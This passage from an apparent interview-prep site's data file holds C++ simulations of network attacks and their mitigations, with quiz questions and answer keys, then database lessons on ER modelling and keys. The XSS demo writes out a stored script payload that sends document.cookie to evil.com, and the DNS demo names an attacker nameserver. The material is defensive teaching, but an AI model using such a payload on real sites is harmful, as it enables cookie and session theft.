// ---- SYN Flood Attack Simulation ----
struct SYNEntry {
    string srcIP;
    int srcPort;
    time_t timestamp;
    bool legitimate;
};

class TCPServer {
    int maxSynQueue;
    queue<SYNEntry> synQueue;
    int droppedConnections;
    bool synCookiesEnabled;

public:
    TCPServer(int queueSize, bool cookies)
        : maxSynQueue(queueSize), droppedConnections(0),
          synCookiesEnabled(cookies) {}

    bool handleSYN(const string& srcIP, int srcPort, bool legit) {
        if (synCookiesEnabled) {
            // With SYN cookies: don't allocate state
            // Just respond with encoded SYN-ACK
            cout << "    SYN from " << srcIP << ":" << srcPort
                 << " -> SYN-ACK (cookie, no state)" << endl;
            return true;
        }

        if ((int)synQueue.size() >= maxSynQueue) {
            droppedConnections++;
            cout << "    SYN from " << srcIP << ":" << srcPort
                 << " -> DROPPED! (queue full: " << synQueue.size()
                 << "/" << maxSynQueue << ")" << endl;
            return false;
        }

        synQueue.push({srcIP, srcPort, time(nullptr), legit});
        cout << "    SYN from " << srcIP << ":" << srcPort
             << " -> SYN-ACK sent (queue: " << synQueue.size()
             << "/" << maxSynQueue << ")" << endl;
        return true;
    }

    void stats() {
        cout << "  Queue: " << synQueue.size() << "/"
             << maxSynQueue << ", Dropped: "
             << droppedConnections << endl;
    }
};

void simulateSYNFlood() {
    cout << "=== SYN Flood Attack ===" << endl;

    // Without SYN cookies
    cout << "\\n--- Without SYN Cookies ---" << endl;
    TCPServer server1(5, false);
    // Legitimate connection
    server1.handleSYN("10.0.0.1", 49152, true);
    // Attack traffic (spoofed IPs)
    for (int i = 0; i < 8; i++) {
        string fakeIP = "192.168." + to_string(rand()%256) + "."
                        + to_string(rand()%256);
        server1.handleSYN(fakeIP, 1000 + i, false);
    }
    // Legitimate user during attack
    server1.handleSYN("10.0.0.2", 49153, true);
    server1.stats();

    // With SYN cookies
    cout << "\\n--- With SYN Cookies ---" << endl;
    TCPServer server2(5, true);
    server2.handleSYN("10.0.0.1", 49152, true);
    for (int i = 0; i < 8; i++) {
        string fakeIP = "192.168." + to_string(rand()%256) + "."
                        + to_string(rand()%256);
        server2.handleSYN(fakeIP, 1000 + i, false);
    }
    server2.handleSYN("10.0.0.2", 49153, true);
    server2.stats();
}

// ---- ARP Spoofing / MITM Simulation ----
struct ARPEntry {
    string ip;
    string mac;
};

void simulateARPSpoofing() {
    cout << "\\n=== ARP Spoofing (MITM) ===" << endl;

    // Normal ARP table
    map<string, string> victimARP;
    victimARP["192.168.1.1"] = "AA:BB:CC:DD:EE:01"; // gateway
    victimARP["192.168.1.2"] = "AA:BB:CC:DD:EE:02"; // victim
    victimARP["192.168.1.100"] = "AA:BB:CC:DD:EE:FF"; // attacker

    cout << "--- Before Attack ---" << endl;
    cout << "  Victim's ARP Table:" << endl;
    for (auto& [ip, mac] : victimARP) {
        cout << "    " << ip << " -> " << mac << endl;
    }
    cout << "  Traffic: Victim -> Gateway (normal path)" << endl;

    // ARP Spoofing: attacker sends fake ARP reply
    cout << "\\n--- ARP Spoofing Attack ---" << endl;
    cout << "  Attacker sends: ARP Reply" << endl;
    cout << "    192.168.1.1 (gateway) is at AA:BB:CC:DD:EE:FF (attacker MAC)"
         << endl;

    // Victim's ARP table is poisoned
    victimARP["192.168.1.1"] = "AA:BB:CC:DD:EE:FF"; // POISONED!

    cout << "\\n--- After Attack ---" << endl;
    cout << "  Victim's ARP Table (POISONED):" << endl;
    for (auto& [ip, mac] : victimARP) {
        cout << "    " << ip << " -> " << mac;
        if (ip == "192.168.1.1") cout << "  ** POISONED **";
        cout << endl;
    }
    cout << "  Traffic: Victim -> ATTACKER -> Gateway (MITM!)" << endl;
    cout << "  Attacker can now read/modify all traffic!" << endl;
}

// ---- DNS Cache Poisoning Simulation ----
void simulateDNSPoisoning() {
    cout << "\\n=== DNS Cache Poisoning ===" << endl;

    map<string, string> resolverCache;
    resolverCache["www.google.com"] = "142.250.80.4";
    resolverCache["www.example.com"] = "93.184.216.34";

    cout << "--- Before Attack ---" << endl;
    cout << "  Resolver Cache:" << endl;
    for (auto& [domain, ip] : resolverCache) {
        cout << "    " << domain << " -> " << ip << endl;
    }

    // Attacker poisons cache
    cout << "\\n--- Attack in Progress ---" << endl;
    cout << "  1. Attacker queries resolver for random123.bank.com" << endl;
    cout << "  2. Resolver queries authoritative NS for bank.com" << endl;
    cout << "  3. Attacker races to send forged response:" << endl;
    cout << "     random123.bank.com -> 6.6.6.6 (attacker)" << endl;
    cout << "     bank.com NS -> evil-ns.attacker.com" << endl;
    cout << "  4. Forged response accepted! Cache poisoned." << endl;

    resolverCache["bank.com"] = "6.6.6.6"; // POISONED!
    resolverCache["www.bank.com"] = "6.6.6.6"; // POISONED!

    cout << "\\n--- After Attack ---" << endl;
    cout << "  Resolver Cache (POISONED):" << endl;
    for (auto& [domain, ip] : resolverCache) {
        cout << "    " << domain << " -> " << ip;
        if (ip == "6.6.6.6") cout << "  ** POISONED **";
        cout << endl;
    }
    cout << "  All users querying bank.com now go to attacker!" << endl;

    cout << "\\n--- DNSSEC Mitigation ---" << endl;
    cout << "  With DNSSEC, the forged response would fail" << endl;
    cout << "  signature verification -> rejected!" << endl;
}

// ---- XSS Attack Demonstration ----
void simulateXSS() {
    cout << "\\n=== XSS Attack Simulation ===" << endl;

    // Stored XSS
    cout << "--- Stored XSS ---" << endl;
    string maliciousComment =
        "Nice post! <script>fetch('https://evil.com/steal?c='+document.cookie)</script>";
    cout << "  Attacker submits comment:" << endl;
    cout << "    \"" << maliciousComment << "\"" << endl;

    // Without sanitization
    cout << "\\n  Without sanitization (VULNERABLE):" << endl;
    cout << "    HTML output: <p>" << maliciousComment << "</p>" << endl;
    cout << "    ** Script executes! Cookies stolen! **" << endl;

    // With sanitization
    cout << "\\n  With HTML encoding (SAFE):" << endl;
    string sanitized;
    for (char c : maliciousComment) {
        switch (c) {
            case '<': sanitized += "&lt;"; break;
            case '>': sanitized += "&gt;"; break;
            case '&': sanitized += "&amp;"; break;
            case '"': sanitized += "&quot;"; break;
            case '\'': sanitized += "&#39;"; break;
            default: sanitized += c;
        }
    }
    cout << "    HTML output: <p>" << sanitized << "</p>" << endl;
    cout << "    Script rendered as text, not executed." << endl;
}

// ---- Rate Limiter (DDoS mitigation) ----
class RateLimiter {
    map<string, vector<time_t>> requestLog;
    int maxRequests;
    int windowSeconds;
public:
    RateLimiter(int max, int window)
        : maxRequests(max), windowSeconds(window) {}

    bool allowRequest(const string& ip) {
        time_t now = time(nullptr);
        auto& log = requestLog[ip];

        // Remove old entries
        while (!log.empty() && now - log.front() > windowSeconds)
            log.erase(log.begin());

        if ((int)log.size() >= maxRequests) {
            return false; // rate limited
        }
        log.push_back(now);
        return true;
    }
};

void demonstrateRateLimiter() {
    cout << "\\n=== Rate Limiter (DDoS Mitigation) ===" << endl;
    RateLimiter limiter(5, 10); // 5 requests per 10 seconds

    string normalIP = "10.0.0.1";
    string attackerIP = "6.6.6.6";

    cout << "  Policy: 5 requests per 10 seconds" << endl;

    for (int i = 0; i < 8; i++) {
        bool allowed = limiter.allowRequest(attackerIP);
        cout << "  Request " << (i+1) << " from " << attackerIP
             << ": " << (allowed ? "ALLOWED" : "BLOCKED") << endl;
    }

    // Normal user not affected
    cout << "  Request from " << normalIP << ": "
         << (limiter.allowRequest(normalIP) ? "ALLOWED" : "BLOCKED")
         << endl;
}

int main() {
    srand(time(0));
    simulateSYNFlood();
    simulateARPSpoofing();
    simulateDNSPoisoning();
    simulateXSS();
    demonstrateRateLimiter();
    return 0;
}`,
          problems: [
            ['Network Security Practice (GFG)', 'https://www.geeksforgeeks.org/network-security/', 'Medium'],
            ['Cross-Site Scripting (XSS)', 'https://www.geeksforgeeks.org/what-is-cross-site-scripting-xss/', 'Hard'],
            ['CSRF Prevention Techniques', 'https://www.geeksforgeeks.org/what-is-cross-site-request-forgery-csrf/', 'Medium']
          ],
          mcqs: [
            {q: 'SYN cookies mitigate SYN flood attacks by:', o: ['Blocking all SYN packets', 'Encoding connection state in the sequence number so no state is allocated until ACK', 'Rate limiting TCP connections', 'Using UDP instead of TCP'], a: 1},
            {q: 'DNS amplification attacks exploit:', o: ['Open DNS resolvers with spoofed source IPs', 'SQL injection in DNS servers', 'Buffer overflow in DNS software', 'DNSSEC vulnerabilities'], a: 0},
            {q: 'Which HTTP header helps prevent XSS attacks by restricting script sources?', o: ['X-Frame-Options', 'Content-Security-Policy', 'Strict-Transport-Security', 'X-XSS-Protection'], a: 1},
            {q: 'CSRF exploits:', o: ['Server input validation', 'Browser auto-sending cookies cross-site', 'DNS cache', 'Weak encryption'], a: 1},
            {q: 'SQL injection is best prevented by:', o: ['HTTPS', 'Input length validation', 'Parameterized queries', 'Rate limiting'], a: 2},
            {q: 'HSTS prevents:', o: ['DDoS', 'SSL stripping', 'DNS poisoning', 'ARP spoofing'], a: 1},
            {q: 'Mirai botnet targeted:', o: ['Desktops', 'IoT devices with default credentials', 'Cloud servers', 'Database servers'], a: 1},
            {q: 'BCP38 ingress filtering prevents:', o: ['XSS', 'SQL injection', 'IP address spoofing', 'Cookie theft'], a: 2}
          ],
        },
      ]
    }

  ]
};
const DBMS_CONTENT = {
  id: 'dbms', t: 'Database Management',
  tabs: [
    {
      id: 'er', t: 'ER Model & Keys',
      topics: [
        {
          t: 'ER Diagrams & Relational Model',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">Imagine you\'re designing the backend for a trading platform. Before writing a single line of SQL, you need a blueprint that captures entities like <b>Instruments</b>, <b>Traders</b>, <b>Orders</b>, and <b>Portfolios</b> along with their relationships and constraints. The Entity-Relationship model is exactly that blueprint &mdash; it lets you reason about data at a conceptual level before committing to a physical schema. Getting the ER model wrong leads to painful schema migrations, data anomalies, and integrity issues that can cascade through every service that touches the database. In interviews, ER modeling questions test whether you can think structurally about data before diving into implementation.</p></div><div class="learn-section"><div class="learn-h">Introduction to ER Model</div><p class="learn-p">The <b>Entity-Relationship (ER) Model</b> is a high-level conceptual data model used to describe the structure of a database. It was proposed by <b>Peter Chen</b> in 1976 and provides a graphical way to represent the logical structure of a database. The ER model is crucial in the <b>database design phase</b> — it acts as a blueprint before the actual relational schema is created.</p><p class="learn-p">The ER model consists of three main components:</p><ol class="learn-list"><li><b>Entities</b> — Real-world objects or concepts (e.g., Student, Course, Employee)</li><li><b>Attributes</b> — Properties of entities (e.g., name, age, salary)</li><li><b>Relationships</b> — Associations between entities (e.g., Student <i>enrolls in</i> Course)</li></ol></div><div class="learn-section"><div class="learn-h">Entities and Entity Sets</div><p class="learn-p">An <b>entity</b> is a distinguishable real-world object. An <b>entity set</b> is a collection of similar entities. For example, all students in a university form the <code>Student</code> entity set.</p><p class="learn-p">Entities can be classified as:</p><ul class="learn-list"><li><b>Strong Entity</b> — Has a primary key and can exist independently. Represented by a <b>rectangle</b> in ER diagrams. Example: <code>Student</code>, <code>Employee</code>.</li><li><b>Weak Entity</b> — Cannot be uniquely identified by its own attributes alone; depends on a <b>strong (owner) entity</b>. Represented by a <b>double rectangle</b>. Example: <code>Dependent</code> of an Employee. It uses a <b>partial key (discriminator)</b> combined with the owner\'s primary key.</li></ul><div class="learn-tip"><b>Tip:</b> In ER diagrams, a weak entity is always connected to its owner entity via a <b>double diamond</b> (identifying relationship). The partial key is shown with a <b>dashed underline</b>.</div></div><div class="learn-section"><div class="learn-h">Attributes</div><p class="learn-p">Attributes describe properties of entities. They are represented by <b>ovals</b> connected to their entity rectangle.</p><table class="learn-table"><tr><th>Attribute Type</th><th>Description</th><th>ER Symbol</th></tr><tr><td>Simple</td><td>Atomic, cannot be divided further (e.g., Age)</td><td>Simple oval</td></tr><tr><td>Composite</td><td>Can be divided into sub-parts (e.g., Name = First + Last)</td><td>Oval with sub-ovals</td></tr><tr><td>Derived</td><td>Computed from other attributes (e.g., Age from DOB)</td><td>Dashed oval</td></tr><tr><td>Multi-valued</td><td>Can have multiple values (e.g., Phone numbers)</td><td>Double oval</td></tr><tr><td>Key Attribute</td><td>Uniquely identifies an entity (e.g., Student_ID)</td><td>Underlined oval</td></tr></table></div><div class="learn-section"><div class="learn-h">Relationships and Cardinality</div><p class="learn-p">A <b>relationship</b> is an association between two or more entities. Represented by a <b>diamond</b> in ER diagrams.</p><p class="learn-p"><b>Cardinality constraints</b> specify the number of entities that can participate in a relationship:</p><ul class="learn-list"><li><b>1:1 (One-to-One)</b> — Each entity in A is associated with at most one entity in B and vice versa. Example: Each department has exactly one manager.</li><li><b>1:N (One-to-Many)</b> — Each entity in A can be associated with many entities in B, but each entity in B is associated with at most one entity in A. Example: One department has many employees.</li><li><b>M:N (Many-to-Many)</b> — Each entity in A can be associated with many in B and vice versa. Example: Students and Courses.</li></ul><p class="learn-p"><b>Participation constraints</b>:</p><ul class="learn-list"><li><b>Total participation</b> (double line) — Every entity must participate in the relationship.</li><li><b>Partial participation</b> (single line) — Some entities may not participate.</li></ul><div class="learn-warn"><b>Warning:</b> A common interview mistake is confusing cardinality with participation. Cardinality = how many; Participation = must it participate at all?</div></div><div class="learn-section"><div class="learn-h">Converting ER Diagrams to Relational Schema</div><p class="learn-p">The ER-to-Relational mapping follows these rules:</p><ol class="learn-list"><li><b>Strong entity</b> → Table with all simple attributes. Composite attributes are flattened. Multi-valued attributes get a separate table.</li><li><b>Weak entity</b> → Table with its attributes + the primary key of the owner entity as a foreign key. Primary key = owner PK + partial key.</li><li><b>1:1 relationship</b> → Add the PK of one entity as FK in the other (preferably the one with total participation).</li><li><b>1:N relationship</b> → Add the PK of the "1" side as FK in the "N" side table.</li><li><b>M:N relationship</b> → Create a new <b>junction table</b> with PKs of both entities as a composite PK.</li></ol><div class="learn-code">-- Example: M:N relationship between Student and Course\nCREATE TABLE Enrollment (\n    student_id INT,\n    course_id  INT,\n    grade      CHAR(2),\n    PRIMARY KEY (student_id, course_id),\n    FOREIGN KEY (student_id) REFERENCES Student(student_id),\n    FOREIGN KEY (course_id) REFERENCES Course(course_id)\n);</div><div class="learn-tip"><b>Tip:</b> In interviews, always clarify cardinality and participation constraints before converting ER to schema. This is a frequently tested skill in interviews.</div></div><div class="learn-section"><div class="learn-h">Extended ER (EER) Model</div><p class="learn-p">The EER model extends the basic ER model with:</p><ul class="learn-list"><li><b>Generalization</b> — Bottom-up: combining similar entity types into a higher-level entity (e.g., Car + Truck → Vehicle).</li><li><b>Specialization</b> — Top-down: dividing a higher-level entity into sub-entities (e.g., Employee → Manager, Engineer).</li><li><b>Aggregation</b> — Treating a relationship as an entity for participating in another relationship.</li></ul><p class="learn-p">Specialization can be <b>disjoint (d)</b> or <b>overlapping (o)</b>, and <b>total</b> or <b>partial</b>.</p></div><div class="learn-section"><div class="learn-h">Pitfalls &amp; Edge Cases</div><ul class="learn-list"><li><b>Fan Trap</b> &mdash; Occurs when two or more 1:N relationships fan out from the same entity, making it ambiguous which path to follow for certain queries. Solution: restructure the relationships or add a direct relationship.</li><li><b>Chasm Trap</b> &mdash; Occurs when a path between entities exists in the model but some instances have no connecting data (due to partial participation), leading to lost rows in queries. Solution: ensure total participation or use outer joins.</li><li><b>Overusing weak entities</b> &mdash; Not every dependent table is a weak entity. A weak entity must lack its own unique identifier. If a table has a natural unique key, it is a strong entity even if it has a foreign key dependency.</li><li><b>Confusing multi-valued attributes with 1:N relationships</b> &mdash; A phone number list for a person is a multi-valued attribute. But if each phone also has its own attributes (carrier, type, activation date), it should be modeled as a separate entity with a 1:N relationship.</li><li><b>Ternary vs. three binary relationships</b> &mdash; A ternary relationship among three entities is NOT always decomposable into three binary relationships. The semantics can differ; carefully verify the constraint before splitting.</li></ul></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: What is the difference between a weak and strong entity?</b><br>A: A strong entity has its own primary key and exists independently. A weak entity depends on an owner entity and uses a partial key (discriminator) combined with the owner\'s PK to be uniquely identified. In ER diagrams, weak entities use double rectangles and identifying relationships use double diamonds.</p><p class="learn-p"><b>Q2: How do you convert a ternary M:N:P relationship into tables?</b><br>A: Create a junction table containing the primary keys of all three participating entities as foreign keys. The composite of all three forms the primary key of the junction table, unless functional dependencies allow a smaller key.</p><p class="learn-p"><b>Q3: When should you use aggregation in ER modeling?</b><br>A: Use aggregation when you need a relationship to participate in another relationship. For example, if Employee "works on" Project, and that work assignment is "monitored by" a Manager, you aggregate the works-on relationship into an entity and connect it to Manager.</p><p class="learn-p"><b>Q4: What is the difference between generalization and specialization?</b><br>A: Generalization is bottom-up: you combine multiple lower-level entity types into a single higher-level entity (e.g., Car + Truck &rarr; Vehicle). Specialization is top-down: you divide a higher-level entity into sub-entities based on distinguishing features (e.g., Employee &rarr; Manager, Engineer). Both result in the same IS-A hierarchy.</p><p class="learn-p"><b>Q5: How do you handle multi-valued attributes during ER-to-relational mapping?</b><br>A: Create a separate table for the multi-valued attribute containing the primary key of the owning entity as a foreign key plus the attribute value. The composite of both columns becomes the primary key. For example, Employee phone numbers become a table (emp_id, phone_number) with PK (emp_id, phone_number).</p><p class="learn-p"><b>Q6: Explain total vs. partial participation with a real example.</b><br>A: In a university database, every Course must be offered by a Department (total participation of Course in the "offers" relationship &mdash; shown by a double line). However, not every Professor may be advising a student (partial participation of Professor in the "advises" relationship &mdash; shown by a single line).</p><p class="learn-p"><b>Q7: How do you decide whether to place the FK in a 1:1 relationship?</b><br>A: Place the FK on the side with total participation. If both sides have total participation, either side works. If both have partial participation, consider which side is queried more often, or merge the tables if the entities are tightly coupled.</p></div>',
          code: `-- =============================================
-- ER Model to Relational Schema: Complete Example
-- =============================================

-- Strong Entity: Department
CREATE TABLE Department (
    dept_id     INT PRIMARY KEY,
    dept_name   VARCHAR(100) NOT NULL,
    location    VARCHAR(200)
);

-- Strong Entity: Employee
CREATE TABLE Employee (
    emp_id      INT PRIMARY KEY,
    first_name  VARCHAR(50) NOT NULL,
    last_name   VARCHAR(50) NOT NULL,
    dob         DATE,
    salary      DECIMAL(10,2),
    dept_id     INT,
    -- 1:N relationship: Department has many Employees
    FOREIGN KEY (dept_id) REFERENCES Department(dept_id)
);

-- Weak Entity: Dependent (depends on Employee)
-- PK = emp_id + dependent_name (partial key)
CREATE TABLE Dependent (
    emp_id          INT,
    dependent_name  VARCHAR(100),
    relationship    VARCHAR(50),
    dob             DATE,
    PRIMARY KEY (emp_id, dependent_name),
    FOREIGN KEY (emp_id) REFERENCES Employee(emp_id)
        ON DELETE CASCADE
);

-- 1:1 Relationship: Department managed by one Employee
ALTER TABLE Department
    ADD manager_id INT UNIQUE,
    ADD FOREIGN KEY (manager_id) REFERENCES Employee(emp_id);

-- Strong Entity: Project
CREATE TABLE Project (
    project_id   INT PRIMARY KEY,
    project_name VARCHAR(200) NOT NULL,
    budget       DECIMAL(12,2)
);

-- M:N Relationship: Employee works on Project
CREATE TABLE Works_On (
    emp_id      INT,
    project_id  INT,
    hours       DECIMAL(5,1),
    PRIMARY KEY (emp_id, project_id),
    FOREIGN KEY (emp_id)     REFERENCES Employee(emp_id),
    FOREIGN KEY (project_id) REFERENCES Project(project_id)
);

-- Multi-valued attribute: Employee phone numbers
CREATE TABLE Employee_Phone (
    emp_id       INT,
    phone_number VARCHAR(15),
    PRIMARY KEY (emp_id, phone_number),
    FOREIGN KEY (emp_id) REFERENCES Employee(emp_id)
);

-- Specialization: Employee -> Manager, Engineer
CREATE TABLE Manager (
    emp_id          INT PRIMARY KEY,
    bonus_percent   DECIMAL(4,2),
    FOREIGN KEY (emp_id) REFERENCES Employee(emp_id)
);

CREATE TABLE Engineer (
    emp_id      INT PRIMARY KEY,
    tech_stack  VARCHAR(200),
    FOREIGN KEY (emp_id) REFERENCES Employee(emp_id)
);`,
          problems: [
            ['Weak Entity Sets', 'https://www.geeksforgeeks.org/weak-entity-set-in-er-diagrams/', 'Easy'],
            ['Generalization and Specialization', 'https://www.geeksforgeeks.org/generalization-specialization-and-aggregation-in-er-model/', 'Medium'],
            ['Cardinality and Participation', 'https://www.geeksforgeeks.org/structural-constraints-of-relationships-in-er-model/', 'Easy']
          ],
          mcqs: [
            {q: 'A weak entity set always has which type of participation in its identifying relationship?', o: ['Partial participation', 'Total participation', 'Optional participation', 'No participation'], a: 1},
            {q: 'In an ER diagram, a derived attribute is represented by:', o: ['Double oval', 'Dashed oval', 'Oval with underline', 'Double rectangle'], a: 1},
            {q: 'A M:N relationship between entities A and B is converted to a relational schema by:', o: ['Adding FK in A referencing B', 'Adding FK in B referencing A', 'Creating a new junction table with PKs of both A and B', 'Merging A and B into one table'], a: 2},
            {q: 'In an ER diagram, total participation of entity set A in a relationship is represented by:', o: ['A single line connecting A to the relationship', 'A double line connecting A to the relationship', 'A dashed line connecting A to the relationship', 'A double diamond for the relationship'], a: 1},
            {q: 'Which of the following is TRUE about a weak entity?', o: ['It always has a primary key of its own', 'It is represented by a dashed rectangle', 'Its primary key is formed by combining the owner entity PK with its partial key', 'It cannot participate in any relationship other than with its owner'], a: 2},
            {q: 'Aggregation in the EER model is used when:', o: ['Two entities need to be merged into one', 'A relationship needs to participate in another relationship', 'An entity has multi-valued attributes', 'Generalization is not possible'], a: 1},
            {q: 'A composite attribute in an ER diagram is represented by:', o: ['A dashed oval', 'A double oval', 'An oval connected to sub-ovals', 'An underlined oval'], a: 2},
            {q: 'In a 1:N relationship, where is the foreign key placed during ER-to-relational mapping?', o: ['In the table on the "1" side', 'In the table on the "N" side', 'In a separate junction table', 'In both tables'], a: 1}
          ]
        },
        {
          t: 'Keys & Constraints',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">Consider a financial database tracking millions of trades per day. Without properly defined keys, two trades could become indistinguishable, foreign key references could point to nonexistent records, and constraint violations could corrupt portfolio valuations. Keys and constraints are the <b>guardrails of data integrity</b> &mdash; they guarantee uniqueness, enforce relationships between tables, and prevent invalid data from entering the system. In interviews, candidates who can derive candidate keys from functional dependencies and articulate the nuances of referential integrity actions (CASCADE vs. RESTRICT vs. SET NULL) demonstrate a deep understanding of relational theory that separates them from those who only know surface-level SQL.</p></div><div class="learn-section"><div class="learn-h">Introduction to Keys</div><p class="learn-p"><b>Keys</b> are fundamental to the relational model. They uniquely identify tuples (rows) in a relation (table) and establish relationships between tables. Understanding keys is critical for database design, normalization, and query optimization.</p><p class="learn-p">A <b>superkey</b> is any set of attributes that can uniquely identify a tuple. A <b>candidate key</b> is a minimal superkey — removing any attribute from it would make it no longer unique.</p></div><div class="learn-section"><div class="learn-h">Types of Keys</div><table class="learn-table"><tr><th>Key Type</th><th>Definition</th><th>Example</th></tr><tr><td>Super Key</td><td>Any set of attributes that uniquely identifies a tuple</td><td>{emp_id}, {emp_id, name}, {emp_id, name, salary}</td></tr><tr><td>Candidate Key</td><td>Minimal super key (no proper subset is a super key)</td><td>{emp_id}, {ssn}</td></tr><tr><td>Primary Key</td><td>The chosen candidate key used for identification</td><td>emp_id chosen as PK</td></tr><tr><td>Alternate Key</td><td>Candidate keys not chosen as primary key</td><td>ssn (if emp_id is PK)</td></tr><tr><td>Foreign Key</td><td>Attribute(s) referencing the primary key of another table</td><td>dept_id in Employee referencing Department</td></tr><tr><td>Composite Key</td><td>A key consisting of two or more attributes</td><td>{student_id, course_id} in Enrollment</td></tr><tr><td>Surrogate Key</td><td>System-generated artificial key with no business meaning</td><td>AUTO_INCREMENT id</td></tr></table><div class="learn-tip"><b>Tip:</b> To find candidate keys from functional dependencies, find the <b>attribute closure</b> of each combination. The minimal set whose closure equals all attributes is a candidate key.</div></div><div class="learn-section"><div class="learn-h">Finding Candidate Keys from Functional Dependencies</div><p class="learn-p">Given a relation R(A, B, C, D, E) with FDs: {A→B, BC→D, E→A}, find the candidate keys.</p><ol class="learn-list"><li>Attributes that appear <b>only on the left side</b> of FDs (or neither side) must be part of every candidate key. Here, <b>E</b> and <b>C</b> never appear on the right side alone.</li><li>Compute closure of {E, C}: EC+ = {E, C} → add A (E→A) → {E, C, A} → add B (A→B) → {E, C, A, B} → add D (BC→D) → {E, C, A, B, D} = R. So <b>{E, C}</b> is a candidate key.</li><li>Check subsets: {E}+ = {E, A, B} ≠ R. {C}+ = {C} ≠ R. So {E, C} is minimal.</li></ol><div class="learn-code">-- Attribute closure algorithm (pseudocode)\nresult = given_attributes\nrepeat:\n    for each FD X -> Y:\n        if X is subset of result:\n            result = result union Y\nuntil result does not change\n-- If result == all attributes of R, given_attributes is a superkey</div><div class="learn-warn"><b>Warning:</b> Many students forget that attributes appearing on neither side of any FD must be in every candidate key. Always check for such attributes first.</div></div><div class="learn-section"><div class="learn-h">Integrity Constraints</div><p class="learn-p"><b>Constraints</b> enforce rules on data to maintain correctness and consistency.</p><ul class="learn-list"><li><b>Domain Constraint</b> — Each attribute must have values from its defined domain (e.g., age must be a positive integer).</li><li><b>Entity Integrity Constraint</b> — The <b>primary key</b> cannot be NULL. Every tuple must be uniquely identifiable.</li><li><b>Referential Integrity Constraint</b> — A <b>foreign key</b> value must either be NULL or match an existing primary key value in the referenced table.</li><li><b>Key Constraint</b> — Values of candidate keys must be unique across all tuples.</li><li><b>NOT NULL Constraint</b> — An attribute cannot take NULL values.</li><li><b>CHECK Constraint</b> — A condition that must be true for every tuple (e.g., salary &gt; 0).</li><li><b>UNIQUE Constraint</b> — Values must be unique (allows NULLs, unlike PK).</li><li><b>DEFAULT Constraint</b> — Provides a default value when none is specified.</li></ul></div><div class="learn-section"><div class="learn-h">Referential Integrity and Actions</div><p class="learn-p">When a referenced row is deleted or updated, the DBMS can take one of these actions on the referencing rows:</p><table class="learn-table"><tr><th>Action</th><th>ON DELETE Behavior</th><th>ON UPDATE Behavior</th></tr><tr><td>CASCADE</td><td>Delete all referencing rows</td><td>Update FK in all referencing rows</td></tr><tr><td>SET NULL</td><td>Set FK to NULL in referencing rows</td><td>Set FK to NULL</td></tr><tr><td>SET DEFAULT</td><td>Set FK to its default value</td><td>Set FK to default</td></tr><tr><td>RESTRICT</td><td>Reject the delete operation</td><td>Reject the update operation</td></tr><tr><td>NO ACTION</td><td>Similar to RESTRICT but checked at end of statement</td><td>Similar to RESTRICT</td></tr></table><div class="learn-code">CREATE TABLE Employee (\n    emp_id   INT PRIMARY KEY,\n    name     VARCHAR(100) NOT NULL,\n    dept_id  INT,\n    salary   DECIMAL(10,2) CHECK (salary &gt; 0),\n    email    VARCHAR(100) UNIQUE,\n    FOREIGN KEY (dept_id) REFERENCES Department(dept_id)\n        ON DELETE SET NULL\n        ON UPDATE CASCADE\n);</div></div><div class="learn-section"><div class="learn-h">Functional Dependencies (FDs)</div><p class="learn-p">A <b>functional dependency</b> X → Y means: for any two tuples t1 and t2, if t1[X] = t2[X] then t1[Y] = t2[Y]. In other words, X uniquely determines Y.</p><p class="learn-p"><b>Armstrong\'s Axioms</b> (sound and complete inference rules):</p><ol class="learn-list"><li><b>Reflexivity</b>: If Y ⊆ X, then X → Y (trivial FD)</li><li><b>Augmentation</b>: If X → Y, then XZ → YZ</li><li><b>Transitivity</b>: If X → Y and Y → Z, then X → Z</li></ol><p class="learn-p">Derived rules: <b>Union</b> (X→Y, X→Z ⟹ X→YZ), <b>Decomposition</b> (X→YZ ⟹ X→Y, X→Z), <b>Pseudo-transitivity</b> (X→Y, WY→Z ⟹ WX→Z).</p><div class="learn-tip"><b>Tip:</b> Armstrong\'s axioms are one of the most commonly tested topics in GATE and tech interviews. Practice computing closures and minimal covers.</div></div><div class="learn-section"><div class="learn-h">Pitfalls &amp; Edge Cases</div><ul class="learn-list"><li><b>NULL in UNIQUE vs. PRIMARY KEY</b> &mdash; A UNIQUE constraint allows multiple NULLs (in most RDBMS), but a PRIMARY KEY does not allow any NULLs. This subtle difference is a frequent interview trap.</li><li><b>Composite keys and partial dependencies</b> &mdash; When a composite key like (A, B) exists, if C depends on only A (not the full key), you have a partial dependency. This violates 2NF and is a common normalization question.</li><li><b>Surrogate vs. natural keys</b> &mdash; Surrogate keys (auto-increment IDs) simplify joins but hide business meaning. Natural keys (SSN, email) carry meaning but can change. Interviewers may ask you to argue for one over the other in a given scenario.</li><li><b>Circular foreign keys</b> &mdash; Two tables referencing each other\'s primary keys create a chicken-and-egg insertion problem. Solutions include deferred constraint checking or nullable FKs with a subsequent UPDATE.</li><li><b>CASCADE deletes on large tables</b> &mdash; A single DELETE on a parent can cascade to millions of child rows, causing long locks and potential timeouts. In production systems, soft deletes or batched cascades are preferred.</li></ul></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: How do you find all candidate keys of a relation given a set of FDs?</b><br>A: First, identify attributes that appear only on the left side (or neither side) of any FD &mdash; these must be in every candidate key. Start with that set, compute its closure. If the closure covers all attributes, that set is a candidate key. If not, try adding one attribute at a time and recompute. A candidate key is minimal: no proper subset should also be a superkey.</p><p class="learn-p"><b>Q2: What is the difference between RESTRICT and NO ACTION for foreign keys?</b><br>A: Both prevent deletion/update of a referenced row if referencing rows exist. The difference is timing: RESTRICT checks immediately when the statement is executed, while NO ACTION defers the check until the end of the statement (or transaction in some RDBMS). This matters when triggers or other constraints might resolve the conflict before the check.</p><p class="learn-p"><b>Q3: Can a foreign key reference a UNIQUE column that is not the primary key?</b><br>A: Yes. In SQL, a foreign key can reference any column (or set of columns) with a UNIQUE constraint, not just the primary key. However, best practice is to reference the primary key for clarity.</p><p class="learn-p"><b>Q4: What are Armstrong\'s axioms and why are they important?</b><br>A: Armstrong\'s axioms are three inference rules &mdash; Reflexivity, Augmentation, and Transitivity &mdash; that are <b>sound</b> (they only derive correct FDs) and <b>complete</b> (they can derive all FDs that logically follow from a given set). They are the foundation for computing attribute closures, finding candidate keys, and computing minimal covers for normalization.</p><p class="learn-p"><b>Q5: Explain the difference between a superkey and a candidate key with an example.</b><br>A: In a Student table with attributes {student_id, email, name, age}, both {student_id} and 